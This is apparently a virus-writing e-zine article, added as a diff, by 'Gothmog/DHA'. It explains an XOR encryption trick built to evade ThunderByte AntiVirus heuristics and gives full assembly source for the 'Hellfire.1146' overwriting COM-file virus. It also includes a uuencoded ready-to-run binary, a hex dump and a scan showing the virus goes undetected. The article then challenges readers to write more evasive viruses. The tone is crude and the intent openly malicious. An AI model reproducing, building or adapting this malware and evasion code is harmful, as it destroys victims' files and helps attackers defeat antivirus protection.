@@ -1,0 +1,546 @@
+          Generic Anti-Heuristic Encryption Technique for TBAV v7.07
+            Method, Article and Demonstration Virus by Gothmog/DHA
+
+As virus scanners become increasingly more complicated, viruses must as well;
+the days when adding a few NOPs or switching a couple instructions around was
+all you needed to do to create an unscannable masterpiece are gone forever.
+Now, with ThunderByte AntiVirus's new and improved heuristic engine, the days
+of signature-based heuristics are over as well--the new engine bases its
+flagging on the function of a program instead of on its syntax; for example,
+it no longer looks for a "mov ah, 40h" followed soon by an "int 21h", but
+rather for an "int 21h" that has a value of ah=40h upon execution. In short,
+many anti-heuristic tricks that worked wonders only several versions of TBAV
+ago are obsolete.
+
+One aspect of ThunderByte's scanning has remained constant, however, and that
+is its encryption algorithm detection. Instead of using lengthy bypasses to
+remove all your virus's heuristic flags, you only need create an encryption
+routine that is not detected by TBAV's algorithmic scanning--a far simpler
+task.
+
+In the past, this common scheme could be used to overcome TBAV's heuristics;
+it relied upon the fact that the false jump confused the encryption routine
+detector, and was on the whole quite successful and effective:
+
+; ===========================================================================
+;               Encryption/Decryption code taken from Ahav.383
+; ===========================================================================
+
+key             dw      0000
+
+decrypt:
+        mov     dx, word ptr [bp+offset key]          ; bp holds virus offset
+
+; in ahav, dx was set to a random word on entering the routine, therefore two
+; entry points were used... other routines can and will vary. be creative....
+
+encrypt:
+        lea     si, [offset start_encrypt+bp]
+        jmp     false_jump
+
+xor_loop:
+        lodsw
+        xor     ax,dx
+        stosw
+        loop    xor_loop
+        ret
+
+false_jump:
+        mov     cx, (end_encrypt - start_encrypt + 1) / 2
+        mov     di, si
+        jmp     xor_loop
+
+; ============================================================[ code ends ]==
+
+Unfortunately, such an approach no longer works with ThunderByte; the virus
+is decrypted, and gets the # flag as well as any applicable flags that the
+encrypted portion triggers:
+
+C:\VIRUS\DHA\AHAV-383.COM infected by Ahav.336-383 virus
+c  No checksum / recovery information (Anti-Vir.Dat) available.
+F  Suspicious file access.  Might be able to infect a file.
+S  Contains a routine to search for executable (.COM or .EXE) files.
+#  Found a code decryption routine or debugger trap.  This is common
+   for viruses but also for some copy-protected software.
+O  Found code that can be used to overwrite/move a program in memory.
+B  Back to entry point.  Contains code to re-start the program after
+   modifications at the entry-point are made.  Very usual for viruses.
+
+Clearly, some new encryption routine is needed... And _that_ is what this
+article is about.
+
+I was fooling around with my encryption code the other day, testing ideas for
+simple, anti-heuristic xor encryption schemes, and I came up with the method
+that this article is concerned with. It is based upon the same idea as Ahav's
+xor loop--that is, to conceal the function of the loop by disguising it as
+some other innocuous control structure. Without further ado, here is the code;
+it should be pretty much self-explanatory:
+
+; ===========================================================================
+;       Generic Anti-Heuristic Encryption/Decryption Code for TBAV v7.07
+; ===========================================================================
+
+encrypt:
+decrypt:
+        mov     si, offset start_encrypt
+        mov     di, si
+        mov     cx, (end_encrypt - start_encrypt + 1) / 2
+
+xor_loop:
+        lodsw
+        jmp     false_jump
+
+false_jump_2:
+        stosw
+        loop    xor_loop
+        ret
+
+false_jump:
+        db      35h                               ; db for xor ax, word value
+
+key             dw      0000
+
+        jnc     false_jump_2 ; <------ this statement fools tbav's heuristics
+
+; continue your code as necessary here; tbav will not locate any decryption
+; loop, and any suspicious code inside the encrypted region will not trigger
+; any flags... see below for a demonstration virus which uses this technique,
+; and passes all heuristics without a hitch.
+
+; ============================================================[ code ends ]==
+
+The essence of this technique is the jnc instruction; since there is no good
+reason why the carry flag should be set when that instruction is executed,
+control will always flow to false_jump_2 and thus into the remainder of the
+decryption code. Thunderbyte, however, sees this as a complex control struct-
+ure and _NOT_ as a decryption loop, and will not even consider any code
+inside the encryption area in its further testing.
+
+To demonstrate this, I cooked up a quickie overwriter, just to show how silly
+TBAV's algorithm is. The Hellfire.1146 virus decrypts itself, searches for a
+com file, checks for prior infection, hooks int 24 while infecting, preserves
+file attributes, size, and file date/time, and displays a fake "Bad command
+or file name" message. When all the files in the current directory are
+infected, it will display an ansi screen and lock in an infinite loop.
+
+Nothing spectacular, but it demonstrates this anti-heuristic method's true
+effectiveness...
+
+; ===========================================================================
+; Hellfire.1146 Anti-Heuristic Demonstration Virus     Written by Gothmog/DHA
+; ===========================================================================
+;
+; Assumes TASM v4.00 or v5.00 or A86 Macro Assembler v4.02;  other assemblers
+; may work, but are not personally tested or quality assured.
+;
+; Assemble with: tasm /m2 hell1146.asm     (/m1 creates an 1148 byte variant)
+;                tlink /t hell1146.obj
+;
+; Alternately:   a86 hell1146.asm hell1146.com   (makes an 1157 byte variant)
+
+.model tiny
+.code
+
+        org     100h
+
+startvirus:
+        call    decrypt
+
+start_encrypt:
+        mov     ah, 4Eh
+
+findfile:
+        mov     cx, 07h
+        mov     dx, offset com_mask
+        int     21h
+        jc      writemessage
+
+        mov     dx, 9Eh
+        mov     ax, 3D00h
+        int     21h
+        xchg    ax, bx
+
+readFile:
+        mov     ah, 3Fh
+        mov     cx, 01h
+        mov     dx, offset bugger
+        int     21h
+
+closeFile:
+        mov     ah, 3Eh
+        int     21h
+
+checkfile:
+        mov     ah, 4Fh
+
+        cmp     byte ptr[bugger], 0E8h
+        je      findfile
+
+        cmp     word ptr cs:[9Ah], offset endvirus-offset startvirus
+        jl      findfile
+
+filegood:
+        mov     ax, 2524h
+        mov     dx, offset [Int24Handler+bp]
+        int     21h
+
+        mov     ax, 4300h
+        mov     dx, 9Eh
+        int     21h
+
+        push    cx
+
+        mov     ax, 4301h
+        xor     cx, cx
+        int     21h
+
+        mov     ax, 3D02h
+        int     21h
+        xchg    ax, bx
+
+infectfile:
+        mov     ah, 2Ch
+        int     21h
+        mov     key, dx
+
+        mov     ah, 40h
+        push    ax
+
+        mov     cx, offset endvirus - offset startvirus
+        push    cx
+
+        mov     dx, offset startvirus
+
+        jmp     writefile
+
+writefakeerror:
+        mov     ax, 4301h
+        mov     dx, 9Eh
+        pop     cx
+        int     21h
+
+        mov     ax, 5701h
+        mov     cx, word ptr cs:[096h]
+        mov     dx, word ptr cs:[098h]
+        int     21h
+
+        mov     ah, 09h
+        mov     dx, offset fakeerror
+        int     21h
+
+quitvirus:
+        int     20h
+
+writemessage:
+        mov     ah, 0Fh
+        int     10h
+
+        xor     ah, ah
+        int     10h
+
+        mov     ah, 01h
+        mov     cx, 2607h
+        int     10h
+
+        mov     ax, 0B800h
+        mov     es, ax
+        mov     cx, 815
+        mov     si, offset msghellfire
+        xor     di, di
+
+uncrunch:
+        xor     dx, dx
+        xor     ax, ax
+        cld
+
+loop_a:
+        lodsb
+        cmp     al, 32
+        jc      foreground
+        stosw
+
+next:
+        loop    loop_a
+        jmp     done
+
+foreground:
+        cmp     al, 16
+        jnc     background
+        and     ah, 0F0h
+        or      ah, al
+        jmp     next
+
+background:
+        cmp     al, 24
+        jz      next_line
+        jnc     flash_bit_toggle
+        sub     al, 16
+        add     al, al
+        add     al, al
+        add     al, al
+        add     al, al
+        and     ah, 8Fh
+        or      ah, al
+        jmp     next
+
+next_line:
+        add     dx, 160
+        mov     di, dx
+        jmp     next
+
+flash_bit_toggle:
+        cmp     al, 27
+        jc      multi_output
+        jnz     next
+        xor     ah, 128
+        jmp     next
+
+multi_output:
+        cmp     al, 25
+        mov     bx, cx
+        lodsb
+        mov     cl, al
+        mov     al, 32
+        jz      start_output
+        lodsb
+        dec     bx
+
+start_output:
+        xor     ch, ch
+        inc     cx
+        rep     stosw
+        mov     cx, bx
+        dec     cx
+        loopnz  loop_a
+
+done:
+        jmp     done
+
+Int24Handler:
+        mov     al, 03h
+        iret
+
+com_mask        db      '*.com', 0
+fakeerror       db      'Bad command or file name', 0Dh, 0Ah, '$'
+msghellfire     db      8,16,26,'O°',24,26,'O°',24,26,'O°',24,26,11,'°',15,20
+                db      'Ú',26,'3Ä¿',8,16,26,13,'°',24,26,11,'°',15,20,'³  ',12
+                db      26,6,'/  ',14,'uh oh, you',39,'ve been infected with'
+                db      ' a virus ',15,'³',7,16,'±±',8,26,11,'°',24,26,11,'°'
+                db      15,20,'³  ',12,'//',25,3,'O',25,2,15,27,'Ò  Â ÒÄÄ¿ Ò'
+                db      25,3,'Ò',25,3,'ÒÄÄ¿ ÄÒÄ ÒÄÄ¿ ÒÄÄ¿  ',27,'³',7,16,'±±'
+                db      8,26,11,'°',24,26,11,'°',15,20,'³ ',12,'//',25,5,'> '
+                db      ' ',15,27,'ÇÄÄ´ ÇÄ',25,2,'º',25,3,'º',25,3,'ÇÄ',25,3,'º'
+                db      '  ÇÄÂÙ ÇÄ',25,3,27,'³',7,16,'±±',8,26,11,'°',24,26,11
+                db      '°',15,20,'³  ',12,'/ \__ ~',25,2,15,27,'Ð  Á ÐÄÄÙ Ð'
+                db      'ÄÄÙ ÐÄÄÙ Ð',25,3,'ÄÐÄ Ð Á  ÐÄÄÙ  ',27,'³',7,16,'±±',8
+                db      26,11,'°',24,26,11,'°',15,20,'³',25,3,12,'||',25,26,26
+                db      4,'/',25,13,15,'³',7,16,'±±',8,26,11,'°',24,26,11,'°'
+                db      15,20,'³  ',12,'(\ \)',25,2,'(~)',25,19,'//  o',25,13
+                db      15,'³',7,16,'±±',8,26,11,'°',24,26,11,'°',15,20,'³  '
+                db      12,'( \ \  / /',25,19,'//',25,3,'>',25,12,15,'³',7,16
+                db      '±±',8,26,11,'°',24,26,11,'°',15,20,'³  ',12,'(  \ \'
+                db      '/ /',25,8,26,11,'_/ \__O',25,13,15,'³',7,16,'±±',8,26
+                db      11,'°',24,26,11,'°',15,20,'³  ',12,'(',25,2,'\__/',25
+                db      8,'/  ___ ',26,5,'_\//',25,16,15,'³',7,16,'±±',8,26,11
+                db      '°',24,26,11,'°',15,20,'³  ',12,'/',25,2,'| /@',25,7,'('
+                db      '  /  / ',26,5,'_)/',25,17,15,'³',7,16,'±±',8,26,11,'°'
+                db      24,26,11,'°',15,20,'³ ',12,'(',25,3,'|//',25,9,'\ \ '
+                db      '/ /',25,2,'(_)',25,19,15,'³',7,16,'±±',8,26,11,'°',24
+                db      26,11,'°',15,20,'³  ',12,'\',25,2,'()',25,11,'\ \O/',25
+                db      26,15,'³',7,16,'±±',8,26,11,'°',24,26,11,'°',15,20,'³'
+                db      25,2,12,'\  |',25,13,') )',25,27,15,'³',7,16,'±±',8,26
+                db      11,'°',24,26,11,'°',15,20,'³',25,3,12,') )',25,12,'/'
+                db      ' /',25,28,15,'³',7,16,'±±',8,26,11,'°',24,26,11,'°',15
+                db      20,'³',25,2,12,'(  |_',25,10,'/ /_  ',10,'so, do you'
+                db      ' like taking it  ',15,'³',7,16,'±±',8,26,11,'°',24,26
+                db      11,'°',15,20,'³',25,2,12,'(',26,3,'_>',25,8,'(',26,3,'_'
+                db      '>',25,7,10,'up the ass?',25,8,15,'³',7,16,'±±',8,26,11
+                db      '°',24,26,11,'°',15,20,'À',26,'3ÄÙ',7,16,'±±',8,26,11
+                db      '°',24,26,13,'°',7,26,'5±',8,26,11,'°',24,26,'O°',24,26
+                db      'O°',24,26,'O°',24
+
+end_encrypt     equ     $ - 1
+
+writefile:
+        call    encrypt
+        pop     cx
+        pop     ax
+        int     21h
+        call    decrypt
+        jmp     writefakeerror
+
+encrypt:
+decrypt:
+        mov     si, offset start_encrypt
+        mov     di, si
+        mov     cx, (end_encrypt - start_encrypt + 1) / 2
+
+xorLoop:
+        lodsw
+        jmp     hahahahaha
+
+oioioioioi:
+        stosw
+        loop    xorLoop
+        ret
+
+hahahahaha:
+        db      35h
+
+key             dw      0000
+
+        jnc     oioioioioi
+
+endvirus:
+
+bugger          db      ?
+f_attr          db      09h dup (?)
+
+        end     startvirus
+
+; ============================================================[ code ends ]==
+
+For those of you reading without a working assembler (there might be one or
+two, you never know...), here is a uuencoded first-generation copy of the
+virus, simply run UUDECODE or its equivalent on the article, or cut and
+paste the encoded section into a text file and decode it:
+
+section 1/1   file hell1146.com   [ Wincode 2.7.3 ]
+
+begin 644 hell1146.com
+MZ&,$M$ZY!P"Z"0+-(7)^NIX`N``]S2&3M#^Y`0"Z>@7-(;0^S2&T3X`^>@7H
+M=-8N@3Z:`'H$?,VX)"6+E@8"S2&X`$.ZG@#-(5&X`4,SR<TAN`(]S2&3M"S-
+M(8D6=@6T0%"Y>@11N@`!Z>T#N`%#NIX`6<TAN`%7+HL.E@`NBQ:8`,TAM`FZ
+M#P+-(<T@M`_-$#+DS1"T`;D')LT0N`"XCL"Y+P.^*@(S_S/2,\#\K#P@<@6K
+MXOCK3#P0<P>`Y/`*X.OQ/!AT$W,9+!`"P`+``L`"P(#DCPK@Z]J!PJ``B_KK
+MTCP;<@=US(#T@.O'/!F+V:R*R+`@=`*L2S+M0?.KB\M)X*KK_K`#SRHN8V]M
+M`$)A9"!C;VUM86YD(&]R(&9I;&4@;F%M90T*)`@0&D^P&!I/L!@:3[`8&@NP
+M#Q3:&C/$OP@0&@VP&!H+L`\4LR`@#!H&+R`@#G5H(&]H+"!Y;W4G=F4@8F5E
+M;B!I;F9E8W1E9"!W:71H(&$@=FER=7,@#[,'$+&Q"!H+L!@:"[`/%+,@(`PO
+M+QD#3QD"#QO2("#"(-+$Q+\@TAD#TAD#TL3$OR#$TL0@TL3$OR#2Q,2_("`;
+MLP<0L;$(&@NP&!H+L`\4LR`,+R\9!3X@(`\;Q\3$M"#'Q!D"NAD#NAD#Q\09
+M`[H@(,?$PMD@Q\09`QNS!Q"QL0@:"[`8&@NP#Q2S("`,+R!<7U\@?AD"#QO0
+M("#!(-#$Q-D@T,3$V2#0Q,39(-`9`\30Q"#0(,$@(-#$Q-D@(!NS!Q"QL0@:
+M"[`8&@NP#Q2S&0,,?'P9&AH$+QD-#[,'$+&Q"!H+L!@:"[`/%+,@(`PH7"!<
+M*1D"*'XI&1,O+R`@;QD-#[,'$+&Q"!H+L!@:"[`/%+,@(`PH(%P@7"`@+R`O
+M&1,O+QD#/AD,#[,'$+&Q"!H+L!@:"[`/%+,@(`PH("!<(%PO("\9"!H+7R\@
+M7%]?3QD-#[,'$+&Q"!H+L!@:"[`/%+,@(`PH&0)<7U\O&0@O("!?7U\@&@5?
+M7"\O&1`/LP<0L;$(&@NP&!H+L`\4LR`@#"\9`GP@+T`9!R@@("\@("\@&@5?
+M*2\9$0^S!Q"QL0@:"[`8&@NP#Q2S(`PH&0-\+R\9"5P@7"`O("\9`BA?*1D3
+M#[,'$+&Q"!H+L!@:"[`/%+,@(`Q<&0(H*1D+7"!<3R\9&@^S!Q"QL0@:"[`8
+M&@NP#Q2S&0(,7"`@?!D-*2`I&1L/LP<0L;$(&@NP&!H+L`\4LQD##"D@*1D,
+M+R`O&1P/LP<0L;$(&@NP&!H+L`\4LQD"#"@@('Q?&0HO("]?("`*<V\L(&1O
+M('EO=2!L:6ME('1A:VEN9R!I="`@#[,'$+&Q"!H+L!@:"[`/%+,9`@PH&@-?
+M/AD(*!H#7SX9!PIU<"!T:&4@87-S/QD(#[,'$+&Q"!H+L!@:"[`/%,`:,\39
+M!Q"QL0@:"[`8&@VP!QHUL0@:"[`8&D^P&!I/L!@:3[`8Z`H`65C-(>@#`.D&
+5_+X#`8O^N2L"K>L$J^+ZPS4``'/W
+`
+end
+sum -r/size 11861/1146
+
+section 1/1   file hell1146.com   [ Wincode 2.7.3 ]
+
+All right... First off, let's examine a hex dump of the virus and see what we
+come up with:
+
+0CB8:0100  E8 63 04 B4 4E B9 07 00-BA 09 02 CD 21 72 7E BA   .c..N.......!r~.
+0CB8:0110  9E 00 B8 00 3D CD 21 93-B4 3F B9 01 00 BA 7A 05   ....=.!..?....z.
+0CB8:0120  CD 21 B4 3E CD 21 B4 4F-80 3E 7A 05 E8 74 D6 2E   .!.>.!.O.>z..t..
+0CB8:0130  81 3E 9A 00 7A 04 7C CD-B8 24 25 8B 96 06 02 CD   .>..z.|..$%.....
+0CB8:0140  21 B8 00 43 BA 9E 00 CD-21 51 B8 01 43 33 C9 CD   !..C....!Q..C3..
+0CB8:0150  21 B8 02 3D CD 21 93 B4-2C CD 21 89 16 76 05 B4   !..=.!..,.!..v..
+0CB8:0160  40 50 B9 7A 04 51 BA 00-01 E9 ED 03 B8 01 43 BA   @P.z.Q........C.
+0CB8:0170  9E 00 59 CD 21 B8 01 57-2E 8B 0E 96 00 2E 8B 16   ..Y.!..W........
+0CB8:0180  98 00 CD 21 B4 09 BA 0F-02 CD 21 CD 20 B4 0F CD   ...!......!. ...
+0CB8:0190  10 32 E4 CD 10 B4 01 B9-07 26 CD 10 B8 00 B8 8E   .2.......&......
+0CB8:01A0  C0 B9 2F 03 BE 2A 02 33-FF 33 D2 33 C0 FC AC 3C   ../..*.3.3.3...<
+0CB8:01B0  20 72 05 AB E2 F8 EB 4C-3C 10 73 07 80 E4 F0 0A    r.....L<.s.....
+0CB8:01C0  E0 EB F1 3C 18 74 13 73-19 2C 10 02 C0 02 C0 02   ...<.t.s.,......
+0CB8:01D0  C0 02 C0 80 E4 8F 0A E0-EB DA 81 C2 A0 00 8B FA   ................
+0CB8:01E0  EB D2 3C 1B 72 07 75 CC-80 F4 80 EB C7 3C 19 8B   ..<.r.u......<..
+0CB8:01F0  D9 AC 8A C8 B0 20 74 02-AC 4B 32 ED 41 F3 AB 8B   ..... t..K2.A...
+0CB8:0200  CB 49 E0 AA EB FE B0 03-CF 2A 2E 63 6F 6D 00 42   .I.......*.com.B
+0CB8:0210  61 64 20 63 6F 6D 6D 61-6E 64 20 6F 72 20 66 69   ad command or fi
+0CB8:0220  6C 65 20 6E 61 6D 65 0D-0A 24 08 10 1A 4F B0 18   le name..$...O..
+0CB8:0230  1A 4F B0 18 1A 4F B0 18-1A 0B B0 0F 14 DA 1A 33   .O...O.........3
+0CB8:0240  C4 BF 08 10 1A 0D B0 18-1A 0B B0 0F 14 B3 20 20   ..............  
+0CB8:0250  0C 1A 06 2F 20 20 0E 75-68 20 6F 68 2C 20 79 6F   .../  .uh oh, yo
+0CB8:0260  75 27 76 65 20 62 65 65-6E 20 69 6E 66 65 63 74   u've been infect
+0CB8:0270  65 64 20 77 69 74 68 20-61 20 76 69 72 75 73 20   ed with a virus 
+0CB8:0280  0F B3 07 10 B1 B1 08 1A-0B B0 18 1A 0B B0 0F 14   ................
+0CB8:0290  B3 20 20 0C 2F 2F 19 03-4F 19 02 0F 1B D2 20 20   .  .//..O.....  
+0CB8:02A0  C2 20 D2 C4 C4 BF 20 D2-19 03 D2 19 03 D2 C4 C4   . .... .........
+0CB8:02B0  BF 20 C4 D2 C4 20 D2 C4-C4 BF 20 D2 C4 C4 BF 20   . ... .... .... 
+0CB8:02C0  20 1B B3 07 10 B1 B1 08-1A 0B B0 18 1A 0B B0 0F    ...............
+0CB8:02D0  14 B3 20 0C 2F 2F 19 05-3E 20 20 0F 1B C7 C4 C4   .. .//..>  .....
+0CB8:02E0  B4 20 C7 C4 19 02 BA 19-03 BA 19 03 C7 C4 19 03   . ..............
+0CB8:02F0  BA 20 20 C7 C4 C2 D9 20-C7 C4 19 03 1B B3 07 10   .  .... ........
+0CB8:0300  B1 B1 08 1A 0B B0 18 1A-0B B0 0F 14 B3 20 20 0C   .............  .
+0CB8:0310  2F 20 5C 5F 5F 20 7E 19-02 0F 1B D0 20 20 C1 20   / \__ ~.....  . 
+0CB8:0320  D0 C4 C4 D9 20 D0 C4 C4-D9 20 D0 C4 C4 D9 20 D0   .... .... .... .
+0CB8:0330  19 03 C4 D0 C4 20 D0 20-C1 20 20 D0 C4 C4 D9 20   ..... . .  .... 
+0CB8:0340  20 1B B3 07 10 B1 B1 08-1A 0B B0 18 1A 0B B0 0F    ...............
+0CB8:0350  14 B3 19 03 0C 7C 7C 19-1A 1A 04 2F 19 0D 0F B3   .....||..../....
+0CB8:0360  07 10 B1 B1 08 1A 0B B0-18 1A 0B B0 0F 14 B3 20   ............... 
+0CB8:0370  20 0C 28 5C 20 5C 29 19-02 28 7E 29 19 13 2F 2F    .(\ \)..(~)..//
+0CB8:0380  20 20 6F 19 0D 0F B3 07-10 B1 B1 08 1A 0B B0 18     o.............
+0CB8:0390  1A 0B B0 0F 14 B3 20 20-0C 28 20 5C 20 5C 20 20   ......  .( \ \  
+0CB8:03A0  2F 20 2F 19 13 2F 2F 19-03 3E 19 0C 0F B3 07 10   / /..//..>......
+0CB8:03B0  B1 B1 08 1A 0B B0 18 1A-0B B0 0F 14 B3 20 20 0C   .............  .
+0CB8:03C0  28 20 20 5C 20 5C 2F 20-2F 19 08 1A 0B 5F 2F 20   (  \ \/ /...._/ 
+0CB8:03D0  5C 5F 5F 4F 19 0D 0F B3-07 10 B1 B1 08 1A 0B B0   \__O............
+0CB8:03E0  18 1A 0B B0 0F 14 B3 20-20 0C 28 19 02 5C 5F 5F   .......  .(..\__
+0CB8:03F0  2F 19 08 2F 20 20 5F 5F-5F 20 1A 05 5F 5C 2F 2F   /../  ___ .._\//
+0CB8:0400  19 10 0F B3 07 10 B1 B1-08 1A 0B B0 18 1A 0B B0   ................
+0CB8:0410  0F 14 B3 20 20 0C 2F 19-02 7C 20 2F 40 19 07 28   ...  ./..| /@..(
+0CB8:0420  20 20 2F 20 20 2F 20 1A-05 5F 29 2F 19 11 0F B3     /  / .._)/....
+0CB8:0430  07 10 B1 B1 08 1A 0B B0-18 1A 0B B0 0F 14 B3 20   ............... 
+0CB8:0440  0C 28 19 03 7C 2F 2F 19-09 5C 20 5C 20 2F 20 2F   .(..|//..\ \ / /
+0CB8:0450  19 02 28 5F 29 19 13 0F-B3 07 10 B1 B1 08 1A 0B   ..(_)...........
+0CB8:0460  B0 18 1A 0B B0 0F 14 B3-20 20 0C 5C 19 02 28 29   ........  .\..()
+0CB8:0470  19 0B 5C 20 5C 4F 2F 19-1A 0F B3 07 10 B1 B1 08   ..\ \O/.........
+0CB8:0480  1A 0B B0 18 1A 0B B0 0F-14 B3 19 02 0C 5C 20 20   .............\  
+0CB8:0490  7C 19 0D 29 20 29 19 1B-0F B3 07 10 B1 B1 08 1A   |..) )..........
+0CB8:04A0  0B B0 18 1A 0B B0 0F 14-B3 19 03 0C 29 20 29 19   ............) ).
+0CB8:04B0  0C 2F 20 2F 19 1C 0F B3-07 10 B1 B1 08 1A 0B B0   ./ /............
+0CB8:04C0  18 1A 0B B0 0F 14 B3 19-02 0C 28 20 20 7C 5F 19   ..........(  |_.
+0CB8:04D0  0A 2F 20 2F 5F 20 20 0A-73 6F 2C 20 64 6F 20 79   ./ /_  .so, do y
+0CB8:04E0  6F 75 20 6C 69 6B 65 20-74 61 6B 69 6E 67 20 69   ou like taking i
+0CB8:04F0  74 20 20 0F B3 07 10 B1-B1 08 1A 0B B0 18 1A 0B   t  .............
+0CB8:0500  B0 0F 14 B3 19 02 0C 28-1A 03 5F 3E 19 08 28 1A   .......(.._>..(.
+0CB8:0510  03 5F 3E 19 07 0A 75 70-20 74 68 65 20 61 73 73   ._>...up the ass
+0CB8:0520  3F 19 08 0F B3 07 10 B1-B1 08 1A 0B B0 18 1A 0B   ?...............
+0CB8:0530  B0 0F 14 C0 1A 33 C4 D9-07 10 B1 B1 08 1A 0B B0   .....3..........
+0CB8:0540  18 1A 0D B0 07 1A 35 B1-08 1A 0B B0 18 1A 4F B0   ......5.......O.
+0CB8:0550  18 1A 4F B0 18 1A 4F B0-18 E8 0A 00 59 58 CD 21   ..O...O.....YX.!
+0CB8:0560  E8 03 00 E9 06 FC BE 03-01 8B FE B9 2B 02 AD EB   ............+...
+0CB8:0570  04 AB E2 FA C3 35 00 00-73 F7                     .....5..s.
+
+Looking at the dump of the virus, we see there's a *.com in plain sight at
+memory location $0209, but does Thunderbyte pick this up?
+
+  Thunderbyte virus detector v7.07 - (C) Copyright 1989-1997 Thunderbyte B.V.
+
+  HELL1146.COM   <Dos com   > c              û
+
+Hehehe... Evidently not. You see, this simple scheme can make your virus
+totally hidden from Thunderbyte, even in its first-generation stage. A
+victim's hard drive could have every com file infected, and TBAV wouldn't say
+a thing...
+
+You can clearly see the possibilities inherent in this encryption method. So,
+for now, I leave you with this issue's virus challenge. Use this technique in
+a new virus, or modify an old virus's encryption, but in any case, create a
+bugger that is invisible to Thunderbyte. Submit all your creations to the
+magazine and we'll have publish them in the next issue.
+
+NOTE: In the VIRUSES.ZIP contained with this issue, there are about 25 other
+variants of the HellFire virus; most of these are earlier versions, and as
+such, you can scan them to see what gets caught, then compare what was
+changed between it and the release version in this file.
+
+ALSO NOTE: If you liked this article, you'll love the Airwalker virus, which
+is contained within this issue. It adds advanced anti-heuristic techniques
+which hide your virus from all the major anti-virus software out there today.
+
+Till next time...                                                 Gothmog/DHA
